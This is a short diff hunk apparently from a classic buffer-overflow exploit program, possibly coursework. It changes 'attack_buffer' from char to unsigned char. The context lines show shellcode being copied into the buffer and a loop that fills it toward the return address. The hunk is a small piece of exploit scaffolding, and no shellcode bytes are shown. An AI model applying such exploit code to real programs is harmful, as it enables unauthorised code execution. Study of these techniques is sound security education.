@@ -16,7 +16,7 @@ main ( int argc, char * argv[] )
 {
 	char *	args[3];
 	char *	env[1];
-	char attack_buffer[BUF_SIZE];
+	unsigned char attack_buffer[BUF_SIZE];
 
 	strcat(attack_buffer, shellcode);
 	for (int i = SHELL_SIZE; i < BUF_TO_RET; i++)
